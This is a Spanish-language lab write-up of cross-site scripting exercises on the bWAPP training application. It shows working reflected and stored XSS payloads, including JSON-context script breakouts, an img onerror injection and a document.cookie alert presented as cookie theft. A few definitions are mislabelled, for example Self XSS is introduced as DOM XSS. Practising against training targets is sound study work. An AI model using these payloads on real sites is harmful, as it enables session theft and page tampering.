# XSS DESENCRYPT

El XSS  o Cross-site scripting es una vulnerabilidad que permite a un tercero inyectar código

Para la practica de del XSS Reflected y el XSS Stored he usado la maquina bWAPP

Reflected(GET,POST,JSON,AJAX/JSON)

Stored

# __TIPOS DE XSS__

- Reflected XSS (Definición y caso práctico)

- Stored XSS (Definición y caso práctico)

- SelfXss (solo definición)

- mXss (solo definición)

- DOM XSS (solo definición)

 </br>
 
## __Reflected XSS__

### __XSS - Reflected (GET)__

En este caso estamos viendo un formulario el cual cuando lo completamos vemos que cambia la URL y nos da la bienvenida.

![](https://i.imgur.com/2BtaJ6x.png)

Al agregar codigo en el formulario vemos que la URL cambia y tambien la respuesta


```xml
/bWAPP/xss_get.php?firstname=<b>goncho</b>&lastname=goncho&form=submit
```
![](https://i.imgur.com/DJTWxM0.png)

También probamos a agregar un alert

```xml
<script>alert('GONCHO')</script>
```
![](https://i.imgur.com/7kVfwam.png)

</br>

### __XSS - Reflected (POST)__


Ahora vamos a probar a hacer un xss reflected en POST

![](https://i.imgur.com/21cOoCu.png)

y vemos que ha interpretado el codigo y vemos su respuesta

![](https://i.imgur.com/3tM494q.png)

inspeccionamos el codigo de la web 

![](https://i.imgur.com/hC0qyup.png)

Podemos utilizar las dos casillas del formulario para añadir codigo de esta forma 

![](https://i.imgur.com/XZf8aFg.png)

y asi seria su respuesta

![](https://i.imgur.com/Ic6TbGN.png)

el código de la web

![](https://i.imgur.com/LyVkkqX.png)

</BR>
</BR>


### __XSS - Reflected (JSON)__

Vamos a probar a buscar una película cualquiera

![](https://i.imgur.com/NM99ICP.png)

y esta es su respuesta

![](https://i.imgur.com/4zAkZHj.png)

Probamos a intentar inyectar código 
```xml
<script>alert('GONCHO')</script>
```
![](https://i.imgur.com/WpdJES2.png)

y al inspeccionar el código de la web nos damos cuenta que el script queda atrapado

![](https://i.imgur.com/e67iG32.png)

Por lo que podriamos colar un script de dos distintas formas

```xml
"}]}';alert('GONCHO')</script>
```

o cerrando por completo el script y abriendo otro distinto
```xml
"}]}';</script><script>alert('GONCHO')</script>
```
esta sería su respuesta

![](https://i.imgur.com/N0mtvyi.png)

También podriamos realizar un robo de cookies, de las dos formas que hemos visto anteriormente

```xml
"}]}';alert('GONCHO')</script>
```

```xml
"}]}';</script><script>alert(document.cookie)</script>
```
![](https://i.imgur.com/VMr27Ft.png)

### __XSS - Reflected (AJAX/JSON)__

Deberiamos colocar el siguiente código, el cual indica que si no hay una imagen llamada x, se ejecutará el alert debido al onerror

```xml
<img src=x onerror=alert('GONHO')>
```
![](https://i.imgur.com/arcuq4Y.png)


## __Stored XSS__

Vamos a practicar un ejemplo de XSS Stored

Cambiaremos el input tipo hidden, y lo convertiremos en tipo text

![](https://i.imgur.com/2tas2zK.png)

Por lo que se nos abrira una nueva casilla en el formulario

![](https://i.imgur.com/EazTuHq.png)


y agregaremos el siguiente codigo

```xml
"><img src=x onerror=alert (2)>
```
![](https://i.imgur.com/2hPMF4W.png)

y esta sería la respuesta

 </br>
 
![](https://i.imgur.com/zH4gJ8s.png)

 </br>
 </br>
 
 ## __DOM XSS__

El DOM XSS ocurre cuando el código malicioso se ejecuta dentro del Document Object Model SelfXss

 ## __Self XSS__

El DOM XSS ocurre cuando el código malicioso que escribes solo te afecta a ti y no puedes utilizarlo contra otros.

## __mXSS__
 El mXSS ocurre cuando el navegador interpreta código benigno y lo convierte en código malicioso.
 
 </br>
  </br>
  </br>
  </br>
  </br> </br>
 
 
 desencrypt

